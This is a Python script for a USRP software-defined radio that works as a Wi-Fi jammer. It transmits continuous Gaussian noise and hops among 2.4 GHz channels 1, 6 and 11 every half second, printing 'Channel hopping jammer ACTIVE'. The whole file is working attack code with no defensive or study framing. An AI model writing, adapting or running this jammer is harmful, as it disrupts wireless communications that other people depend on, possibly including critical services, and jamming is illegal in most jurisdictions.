#!/usr/bin/env python3
import uhd
import numpy as np
import time
import threading

class ChannelHopper:
    def __init__(self):
        self.channels_24 = [2.412e9, 2.437e9, 2.462e9]  # Ch1,6,11
        self.channels_5 = [5.180e9, 5.200e9, 5.745e9]   # Ch36,40,149
        self.current_idx = 0
        self.usrp = uhd.usrp.MultiUSRP("type=b200")
        self.streamer = None
        self.noise = self.generate_noise(65536)
        self.running = False
        
    def generate_noise(self, nsamples):
        real = np.random.normal(0, 1, nsamples)
        imag = np.random.normal(0, 1, nsamples)
        return (real + 1j * imag) / np.sqrt(2)
    
    def setup_tx(self):
        self.usrp.set_tx_rate(10e6)
        self.usrp.set_tx_gain(22, 0)
        self.usrp.set_tx_antenna("TX/RX", 0)
        self.streamer = self.usrp.get_tx_streamer(uhd.usrp.StreamArgs("fc32", "sc16"))
    
    def hop_channel(self):
        """Hop every 500ms"""
        while self.running:
            freq = self.channels_24[self.current_idx % len(self.channels_24)]
            tune_req = uhd.libpyuhd.types.tune_request(freq)
            self.usrp.set_tx_freq(tune_req, 0)
            print(f"🔄 Hopped to {freq/1e9:.3f}GHz")
            self.current_idx += 1
            time.sleep(0.5)
    
    def jam(self):
        self.running = True
        self.setup_tx()
        
        # Hopping thread
        hopper = threading.Thread(target=self.hop_channel, daemon=True)
        hopper.start()
        
        # Main TX loop
        metadata = uhd.types.TXMetadata()
        tx_buffer = self.noise.astype(np.complex64)
        
        print("🚀 Channel hopping jammer ACTIVE")
        try:
            while self.running:
                self.streamer.send(tx_buffer, metadata)
        except KeyboardInterrupt:
            self.running = False

if __name__ == "__main__":
    hopper = ChannelHopper()
    hopper.jam()